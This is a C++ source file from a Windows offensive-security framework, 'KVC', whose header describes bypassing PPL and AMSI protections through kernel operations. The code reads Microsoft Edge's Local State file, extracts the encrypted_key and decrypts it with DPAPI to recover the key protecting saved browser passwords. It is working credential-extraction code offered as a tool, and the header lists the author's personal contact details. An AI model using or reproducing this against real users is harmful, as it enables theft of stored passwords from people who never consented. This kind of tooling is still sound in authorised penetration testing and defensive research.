/*******************************************************************************
  _  ____     ______ 
 | |/ /\ \   / / ___|
 | ' /  \ \ / / |    
 | . \   \ V /| |___ 
 |_|\_\   \_/  \____|

The **Kernel Vulnerability Capabilities (KVC)** framework represents a paradigm shift in Windows security research, 
offering unprecedented access to modern Windows internals through sophisticated ring-0 operations. Originally conceived 
as "Kernel Process Control," the framework has evolved to emphasize not just control, but the complete **exploitation 
of kernel-level primitives** for legitimate security research and penetration testing.

KVC addresses the critical gap left by traditional forensic tools that have become obsolete in the face of modern Windows 
security hardening. Where tools like ProcDump and Process Explorer fail against Protected Process Light (PPL) and Antimalware 
Protected Interface (AMSI) boundaries, KVC succeeds by operating at the kernel level, manipulating the very structures 
that define these protections.

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

*******************************************************************************/

// EdgeDPAPI.cpp - DPAPI decryption for Edge browser password keys
// Implements orchestrator-side password key extraction using Windows DPAPI
#include "EdgeDPAPI.h"
#include <Wincrypt.h>
#include <fstream>
#pragma comment(lib, "Crypt32.lib")

namespace
{
    // Decodes Base64 string into binary data using Windows Crypto API
    std::vector<uint8_t> Base64DecodeSimple(const std::string& input)
    {
        DWORD size = 0;
        if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr))
            return {};
        
        std::vector<uint8_t> data(size);
        CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);
        return data;
    }
}

// Extracts and decrypts Edge password encryption key from Local State file
// Uses Windows DPAPI to decrypt the key in the orchestrator's security context
// This avoids needing COM elevation for Edge passwords specifically
std::vector<uint8_t> DecryptEdgePasswordKeyWithDPAPI(const fs::path& localStatePath, const Console& console)
{
    std::ifstream f(localStatePath, std::ios::binary);
    if (!f) 
        return {};
    
    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    
    // Locate encrypted_key field in JSON
    std::string tag = "\"encrypted_key\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) 
        return {};
    
    size_t end = content.find('"', pos + tag.length());
    if (end == std::string::npos) 
        return {};
    
    // Decode Base64 encrypted key
    std::vector<uint8_t> decoded = Base64DecodeSimple(content.substr(pos + tag.length(), end - pos - tag.length()));
    if (decoded.size() < 5) 
        return {};
    
    // Strip "DPAPI" prefix (5 bytes: 0x44 0x50 0x41 0x50 0x49)
    if (decoded[0] == 0x44 && decoded[1] == 0x50 && decoded[2] == 0x41 && 
        decoded[3] == 0x50 && decoded[4] == 0x49) 
    {
        decoded.erase(decoded.begin(), decoded.begin() + 5);
    }
    
    // Verify DPAPI blob header (0x01 0x00 0x00 0x00)
    if (decoded.size() < 4 || decoded[0] != 0x01 || decoded[1] != 0x00 || 
        decoded[2] != 0x00 || decoded[3] != 0x00)
        return {};
    
    // Decrypt using Windows DPAPI
    DATA_BLOB inputBlob = { static_cast<DWORD>(decoded.size()), decoded.data() };
    DATA_BLOB outputBlob = {};
    
    if (!CryptUnprotectData(&inputBlob, nullptr, nullptr, nullptr, nullptr, 
                           CRYPTPROTECT_UI_FORBIDDEN, &outputBlob))
        return {};
    
    std::vector<uint8_t> result(outputBlob.pbData, outputBlob.pbData + outputBlob.cbData);
    LocalFree(outputBlob.pbData);
    
    console.Success("Edge DPAPI password key extracted successfully");
    return result;
}